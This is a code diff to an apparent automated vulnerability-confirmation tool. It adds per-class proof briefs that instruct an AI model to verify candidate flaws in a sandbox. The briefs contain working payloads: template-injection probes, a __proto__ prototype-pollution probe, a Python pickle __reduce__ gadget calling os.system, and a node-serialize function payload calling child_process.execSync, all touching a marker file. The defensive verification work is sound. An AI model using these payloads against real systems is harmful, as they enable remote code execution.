@@ -45,6 +45,25 @@ def _is_sanitizer(candidate):
     return any(v in hay for v in _SANITIZER_VERB) and any(n in hay for n in _SANITIZER_NOUN)
 
 
+# class CWE -> the proof-shape brief mode (the model's proof recipe for that class). Canary classes
+# (cmd/sqli/nosqli/ssrf/path) never reach here -- rung1 witnesses them deterministically.
+_MODE_BY_CWE = {"CWE-1336": "ssti", "CWE-94": "ssti", "CWE-1321": "protopoll", "CWE-502": "deser"}
+
+
+def _proof_mode(candidate):
+    """Pick the investigate proof shape for a candidate: sanitizer (return-value) > per-class brief
+    (ssti/protopoll/deser) > render (DOM XSS) > call (default). Used by prove and patch so the scaffold,
+    image, and brief stay consistent."""
+    if _is_sanitizer(candidate):
+        return "sanitizer"
+    cwe = getattr(candidate, "cwe", "") or ""
+    if cwe in _MODE_BY_CWE:
+        return _MODE_BY_CWE[cwe]
+    if cwe in _XSS_CWES:
+        return "render"
+    return "call"
+
+
 def _image_for(path):
     """A runtime image that can run this candidate's language (the model can install more if it needs)."""
     if _is_js(path):
@@ -97,6 +116,48 @@ def _brief_for(candidate, target, reason, scaffold=None, mode="call"):
                 f"the scheme stripped or entity/percent-encoded (e.g. '&#106;' or '%6a'), or forced to a "
                 f"relative path. Cite the exact WAVE_RESULT string as the evidence. Supply ONLY the arg; the "
                 f"scaffold owns the module-loading glue.")
+        elif mode == "ssti":
+            lines = "\n".join("  " + run_hint.replace("<payload>", p)
+                              for p in ("{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}"))
+            extra = (
+                "\nThis is a possible SERVER-SIDE TEMPLATE INJECTION -- prove it by EVALUATION, not by "
+                "rendering markup. The scaffold at " + cont + " calls " + fn + "(ARG) and prints WAVE_RESULT. "
+                "Feed a template expression and check whether the engine COMPUTES it. Run these, ONE PER RUN, "
+                "and read WAVE_RESULT:\n" + lines + "\nCONFIRMED if WAVE_RESULT contains the EVALUATED result "
+                "49 (the engine computed 7*7). REFUTED if WAVE_RESULT contains the payload LITERALLY (the text "
+                "{{7*7}} unrendered) or HTML-escaped -- then it is data, not a template. Cite the WAVE_RESULT "
+                "that shows 49. Supply ONLY the arg.")
+        elif mode == "protopoll":
+            probe = ("node -e \"const m=require('/work/REL'); m.FN({}, JSON.parse(process.argv[1])); "
+                     "console.log('POLLUTED:', ({}).wavePolluted)\" "
+                     "'{\"__proto__\":{\"wavePolluted\":\"WZ1\"}}'").replace("REL", rel).replace("FN", fn)
+            extra = (
+                "\nThis is a possible PROTOTYPE POLLUTION (a recursive merge/set/extend that copies "
+                "attacker-controlled keys). Prove it by polluting Object.prototype, then reading a FRESH "
+                "object. Write a probe that calls " + fn + " with a __proto__ payload and then reads a NEW "
+                "empty object -- adapt the require path + the merge signature:\n  " + probe + "\nCONFIRMED if "
+                "a FRESH {} now has wavePolluted equal to your marker (Object.prototype was polluted). REFUTED "
+                "if the fresh object stays clean (the key was dropped / own-property guarded). Cite the "
+                "'POLLUTED: ...' line as the evidence.")
+        elif mode == "deser":
+            if (getattr(candidate, "file", "") or "").endswith(".py"):
+                craft = ("python3 -c \"import pickle,os,base64; print(base64.b64encode(pickle.dumps("
+                         "type('x',(),{'__reduce__':lambda s:(os.system,('touch /work/wave_HIT',))})()"
+                         ")).decode())\"")
+                note = ("Python pickle: craft a payload whose __reduce__ runs "
+                        "os.system('touch /work/wave_HIT'), then feed it to " + fn + " (base64-decode first "
+                        "if the sink takes bytes). Generate it with:\n  " + craft)
+            else:
+                payload = ("'{\"rce\":\"_$$ND_FUNC$$_function(){require(\\'child_process\\')."
+                           "execSync(\\'touch /work/wave_HIT\\')}()\"}'")
+                note = ("Node node-serialize: feed this payload to " + fn + " (it fires on unserialize):\n  "
+                        + payload)
+            extra = (
+                "\nThis is a possible INSECURE DESERIALIZATION -- prove it with a marker SIDE-EFFECT: a "
+                "crafted object that, when deserialized, creates /work/wave_HIT.\n" + note + "\nInvoke the "
+                "sink with the payload and, in the SAME command (each command runs in a fresh container), run "
+                "`ls -l /work/wave_HIT`. CONFIRMED if the file EXISTS (the payload executed on deserialize). "
+                "REFUTED if the load raises / rejects it and no file appears.")
         else:
             extra = (f"\nA reproduction scaffold is ready at {cont} -- it loads this module and calls "
                      f"{fn}(ARG), printing WAVE_RESULT + WAVE_CALL_ERROR. The ARG is parsed as JSON if it can "
